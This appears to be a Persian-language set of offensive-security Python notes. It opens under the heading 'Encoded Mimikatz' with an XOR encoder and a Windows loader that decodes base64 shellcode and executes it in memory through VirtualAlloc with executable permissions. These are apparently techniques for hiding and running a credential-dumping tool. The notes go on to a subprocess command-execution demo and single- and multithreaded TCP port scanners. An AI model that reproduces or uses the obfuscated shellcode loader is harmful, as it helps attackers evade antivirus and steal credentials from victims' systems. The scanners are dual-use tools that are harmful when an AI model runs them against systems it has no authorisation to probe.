
Encoded Mimikatz 

```python
# Encoder.py
input_path = "loader.b64"
output_path = "encoded.xor"
result = ""

with open(input_path, 'r', encoding='utf-8') as fp:
    for line in fp:
        for char in line:
            xor_val = ord(char) ^ 5
            result += f"{xor_val:03d}"

with open(output_path, 'w', encoding='utf-8') as xor_file:
    xor_file.write(result)

```


## execute and decode inmemory

```python
import base64
import ctypes

def run_code_windows(shellcode):
    k32 = ctypes.windll.kernel32
    k32.VirtualAlloc.restype = ctypes.c_void_p
    mem = k32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    
    if not mem:
        return 1

    ctypes.memmove(mem, shellcode, len(shellcode))
    
    executor = ctypes.CFUNCTYPE(ctypes.c_int)(mem)
    return executor()

m_core_raw = open("encoded.xor", encoding='utf-8').read()
decoded_str = ""

for i in range(0, len(m_core_raw), 3):
    t = m_core_raw[i:i+3]
    if t:
        t_val = int(t) ^ 5
        decoded_str += chr(t_val)

try:
    final_shellcode = base64.b64decode(decoded_str)
    run_code_windows(final_shellcode) 
except Exception as e:
    print(e)

```










 ما راه های زیادی داریم برای  اینکه بتونیم یه دستوری رو برای کاربر اجرا کنیم 
استفاده کردن های کتابخونه های مختلف 

- os.system
- os.popen
- subprocess.run
- subprocess.call

اما یکی محبوب ترین توابعی که وجود داره تابع Popen از ماژول subprocess هست که این امکان رو میده علاوه از ارگومان هایی که در قالب یک لیست بهش میدیم به استریم های مختلف دسترسی پیدا کنیم از جمله استریم ارور، استریم out و........ 


```python
import subprocess

process = subprocess.Popen(
    args,              # کامند و آرگومان‌ها
    stdin=None,        # ورودی پروسه
    stdout=None,       # خروجی استاندارد
    stderr=None,       # خروجی خطا
    shell=False,       # اجرا در shell
    cwd=None,          # دایرکتوری کاری
    env=None,          # متغیرهای محیطی
    universal_newlines=False,  # یا text=False
    bufsize=-1,        # اندازه بافر
    # و پارامترهای دیگه...
)

```


اما قرار نیست ما همه این استریم هارو پر کنیم پس میایم به ارگومان هایی که  نیاز داریم رو استفاده میکنیم 
چطور میتونیم بگیم که من میخوام به این استریم دسترسی پیدا کنم ؟ با استفاده از متود PIPE 

```python
process = subprocess.Popen( ['ls', '-la'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True # خروجی رو به string تبدیل کن )

)

stdout, stderr = process.communicate()
print("خروجی:", stdout)
print("خطاها:", stderr)
print("کد خروج:", process.returncode)
```


**چرا PIPE؟**

- `subprocess.PIPE`: یه pipe ایجاد می‌کنه که Python می‌تونه ازش بخونه/بنویسه
- `None` (پیش‌فرض): پروسه مستقیم به ترمینال متصل میشه
- `subprocess.DEVNULL`: خروجی رو دور بریز
- یه فایل باز شده: خروجی رو به فایل بنویس


## demo 

```python
import subprocess
b = input("enter command :")
c = b.split()
result = ""
exec_cmd = subprocess.Popen(c,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
stderr,stdout = exec_cmd.communicate()
result = stderr
print("output command")
print(str(result).replace("\\r","\r",).replace("\\n","\n"))
#print(exec_cmd)
```

خروجی که بهمون میده 


```python
import subprocess
b = input("enter command :")
c = b.split()
result = ""
exec_cmd = subprocess.Popen(c,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
stderr,stdout = exec_cmd.communicate()
result = stderr
print("output command")
print(result.decode())
#print(exec_cmd)
```

این میاد decode شده میده که هم حذف میکنه \r و چیزای دیگرو و هم b رو حذف میکنه 


----


## Demo 

#### port-scan
```python
import socket
from colorama import Fore as charon
def scan(ip):
    
    for port in range(130,1500):
        try:
            con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            con.connect((ip,port))
            print(charon.GREEN+"[+] Port:" + str(port) + charon.GREEN+" OPEN")
        except:
            print(charon.RED+"[-] Port:" + str(port) + charon.RED+" Closed")
scan("127.0.0.1")

```


تو این برنامه اومدیم رو ایپی که مد نظرمون هست port های باز و بسته رو برسی کردیم برای انجام اینکار با استفاده از کتابخونه socket  اول اومدیم از طریق یه کانکشن TCP برقرار کردیم دقت داشته باشین که ما اومدیم try کردیم اما چرا چون اگر کانکشن بزنه و برسی کنه باعث exception میشه تا زمانی که بیایم بگیم تلاش کن برای انجام اینکار اگر باز بود اینو print کن اگر نتونستی که میشه همون except بیا برای من یه چیز دیگرو print کن با استفاده از این کار اومیدم خطا هارو هندل کردیم 
دقت کنید ما همه این فرایند رو داخل یه حلقه انجام دادیم اما این حلقه برای چیه ؟ برای port هایی که مد نظرمون هست 



بیایم حالا این برنامه کند رو سریع ترش کنیم با استفاه از multi-therad



```python
import socket
from colorama import Fore as charon
import threading
import sys

global_ports = list(range(1, 500))

def scan(ip):
    while len(global_ports) != 0:
        try:
            port = global_ports.pop(0)
        except IndexError:
            break
            
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1) 
            s.connect((ip, port))
            print(charon.GREEN + "[+] Port: " + str(port) + " Open")
            s.close() 
        except:
            print(charon.RED + "[-] Port: " + str(port) + " Closed")
if len(sys.argv) > 1:
    ip = sys.argv[1]
else:
    print("Please enter an IP address.")
    sys.exit()

threads = []

for i in range(10):
    t = threading.Thread(target=scan, args=(ip,)) 
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()

```

